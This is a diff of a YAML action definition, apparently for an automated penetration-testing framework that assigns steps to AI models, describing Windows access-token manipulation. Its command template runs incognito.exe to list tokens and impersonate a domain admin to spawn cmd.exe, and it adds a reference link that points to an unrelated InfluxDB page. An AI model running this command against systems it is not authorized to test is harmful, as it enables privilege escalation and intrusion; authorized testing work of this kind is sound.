@@ -2,15 +2,19 @@ name: token_manipulation
 category: privesc
 description: Access token manipulation
 preconditions:
-  - os==windows
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "incognito.exe list_tokens -u && incognito.exe execute -c 'DOMAIN\admin' cmd.exe"
+command_template: "incognito.exe list_tokens -u && incognito.exe execute -c 'DOMAIN\a\
+  dmin' cmd.exe"
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, steal tokens from other processes. Incognito (standalone or Meterpreter module) lists and impersonates tokens."
+mechanism: If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, steal tokens
+  from other processes. Incognito (standalone or Meterpreter module) lists and impersonates
+  tokens.
+hacktricks_ref: network-services-pentesting/8086-pentesting-influxdb.md
